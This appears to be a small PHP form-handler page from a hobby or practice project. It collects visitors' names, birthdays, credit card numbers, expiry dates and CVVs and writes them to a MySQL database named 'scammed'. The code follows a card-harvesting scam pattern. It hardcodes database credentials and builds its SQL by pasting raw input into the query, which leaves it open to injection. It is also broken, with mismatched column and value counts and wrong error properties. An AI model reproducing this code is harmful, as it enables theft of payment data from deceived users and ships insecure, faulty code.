<!DOCTYPE html>
<html>
    <head>
        <title>Form Response</title>
    </head>
    <body>
        <!--<h1>Important Stuff to take into Consideration</h1>
        <p>Thank you for entrusting me with your personal information; it fills me with gratitude. </p><br/>
        
        <h3>Personal Information</h3>
        <p>Your name is <//?= htmlspecialchars ($_POST ['firstname']) . " " . htmlspecialchars ($_POST ['lastname']) ?></p>
        <p>Your birthday is on <//?= htmlspecialchars ($_POST ['bdate']) ?></p>

        <h3>Vital information to take note of...</h3>
        <p>Credit Card Number: <//?= htmlspecialchars ($_POST ['credit']) ?></p>
        <p>Expiration Date: <//?= htmlspecialchars ($_POST ['expdate']) ?></p>
        <p>cvv: <//?= htmlspecialchars ($_POST ['cvv']) ?></p> 

        <h3>Funsies :></h3> -->
        <!--<p>Chicken Preference -> <//?= htmlspecialchars ($_POST ['favouritechicken']) ?></p> -->

        <?php
            // Database connection settings
            $servername = "chickenmcflurry.local";
            $username = "chickenjr";
            $password = "voidnul0"; 
            $database = "scammed"; 

            // Connect to the database
            $conn = new mysqli($servername, $username, $password, $database);

            // Check for successful connection
            if (!$conn) {
                die("Connection failed: " . $conn->mysqli_connect_error);
            }
            else {
                echo "Connected successfully";
            }

            // Process form data
            if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                $name = htmlspecialchars($_POST['firstname']) . " " . htmlspecialchars($_POST['lastname']);
                $birthday = htmlspecialchars ($_POST ['bdate']);
                $creditnum = htmlspecialchars ($_POST ['credit']);
                $expiredate = htmlspecialchars ($_POST ['expdate']);
                $cvv = htmlspecialchars ($_POST ['cvv']);

                // Insert data into the database
                $sql = "INSERT INTO users (firstname, lastname, bdate, credit, expdate, cvv) VALUES ('$name', '$birthday', '$creditnum', '$expiredate', '$cvv')";
    
                if ($conn->query($sql) === TRUE) {
                    echo "<p>Record added successfully.</p>";
                } 
                else {
                    echo "<p>Error: " . $sql . "<br>" . $conn->mysql_error . "</p>";
                }
            }
            




            // Close the connection
            $conn->close();
        ?>

    </body>
</html>
